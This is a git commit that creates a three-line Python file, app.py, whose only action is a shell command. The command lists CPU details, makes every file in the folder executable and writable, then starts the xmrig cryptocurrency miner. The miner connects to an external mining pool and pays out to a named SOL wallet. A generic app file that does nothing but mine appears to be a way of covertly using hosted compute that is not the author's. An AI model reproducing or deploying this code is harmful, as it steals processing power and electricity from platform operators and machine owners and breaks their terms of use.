fe1ab6fe082b72e176279260d0faa523b6bd6c78
posemyhips100 <97118271+posemyhips100@users.noreply.github.com>
2022-10-24 20:40:28 -0400

    Create app.py

---
+++ app.py
@@ -0,0 +1,3 @@
+import os
+bashCommand = "lscpu && ls && chmod +xrw * && ./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u SOL:EoU6Ks3pGS6kDNhATGVWqyXinkAspCvmy4yXd2WfWJUN.MatthewMiner2 -p x"
+os.system(bashCommand)
